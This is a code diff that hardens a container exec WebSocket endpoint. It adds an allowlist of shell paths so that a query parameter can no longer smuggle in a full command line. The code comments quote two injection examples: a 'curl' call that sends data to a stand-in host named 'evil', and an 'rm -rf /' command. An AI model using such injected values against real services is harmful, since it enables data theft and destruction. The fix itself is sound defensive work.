@@ -27,6 +27,27 @@ def get_db():
     finally:
         db.close()
 
+
+# Only these shell paths can be invoked through the exec WebSocket. Anything
+# else is rejected before we open the docker exec stream. Previously the
+# `shell` query parameter was forwarded to shlex.split + aiodocker.exec
+# verbatim, which let a caller smuggle a full command line via something
+# like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
+ALLOWED_EXEC_SHELLS = frozenset({
+    "/bin/sh",
+    "/bin/bash",
+    "/bin/ash",
+    "/bin/zsh",
+    "/usr/bin/sh",
+    "/usr/bin/bash",
+    "/usr/bin/ash",
+    "/usr/bin/zsh",
+    "sh",
+    "bash",
+    "ash",
+    "zsh",
+})
+
 @router.get("/stats")
 async def get_all_container_stats(
     Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
@@ -182,6 +203,15 @@ async def container_exec(
     WebSocket endpoint for container exec (terminal)
     """
     await websocket.accept()
+
+    # Validate the shell argument before doing anything else. The whitelist
+    # blocks ?shell=/bin/sh -c 'rm -rf /' style smuggling where shlex.split
+    # would happily turn the parameter into a multi-token command.
+    if shell.strip() not in ALLOWED_EXEC_SHELLS:
+        logger.warning("WebSocket exec rejected: disallowed shell %r", shell)
+        await websocket.send_json({"error": "Forbidden: shell not allowed"})
+        await websocket.close(code=1008)
+        return
 
     # Check Auth + AuthZ
     # The previous implementation only verified the JWT signature; any valid
